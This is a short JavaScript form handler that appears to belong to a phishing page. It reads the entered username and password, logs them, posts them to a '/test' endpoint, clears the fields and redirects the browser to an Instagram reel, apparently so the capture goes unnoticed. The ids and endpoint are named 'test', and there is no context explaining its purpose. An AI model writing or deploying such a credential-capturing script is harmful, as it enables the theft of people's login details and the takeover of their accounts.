document.getElementById('test').addEventListener('submit', async function(event) {
    event.preventDefault();
    event.stopPropagation();
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    console.log(username, password);
    axios.post('/test', {username: username, password: password});
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
    window.location.href = 'https://www.instagram.com/reel/DAdT2aGPtdo/?igsh=MTVwaTBlZ212dTJsZw==';
});
